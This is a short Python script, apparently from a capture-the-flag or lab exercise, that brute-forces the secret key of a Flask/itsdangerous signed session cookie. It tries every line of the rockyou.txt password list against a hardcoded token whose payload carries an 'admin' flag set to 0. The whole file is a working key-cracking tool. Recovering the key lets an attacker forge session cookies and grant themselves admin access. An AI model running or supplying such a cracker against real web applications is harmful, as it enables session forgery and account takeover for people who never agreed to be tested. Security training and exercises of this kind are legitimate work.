from itsdangerous import URLSafeTimedSerializer, BadSignature
import sys

# The token from the cookie
token = 'eyJhZG1pbiI6MCwidGljayI6MiwidXNlciI6IkFsZXhUdXJpbmcifQ.aDZWqA.fmvuLad_JLq0obkCkvjGQMH1WfU'

# Wordlist path (e.g., rockyou.txt)
wordlist_path = './../../rockyou.txt'

# Split the token into payload + sig parts
parts = token.split('.')
if len(parts) != 3:
    print("Token format is invalid")
    sys.exit(1)

# The unsigned payload part (used for checking)
unsigned_part = '.'.join(parts[:2])

def try_key(key: str) -> bool:
    key = key.strip()
    serializer = URLSafeTimedSerializer(key)
    try:
        data = serializer.loads(token, max_age=3600)
        print(f'[+] Key found: "{key}"')
        print(f'[+] Decoded token: {data}')
        return True
    except BadSignature:
        return False
    except Exception as e:
        # Print this for debugging if needed
        return False

# Brute-force loop
with open(wordlist_path, 'r', encoding='latin-1') as f:
    for line_num, line in enumerate(f, 1):
        if try_key(line):
            break
        if line_num % 10000 == 0:
            print(f'Tried {line_num} keys...')
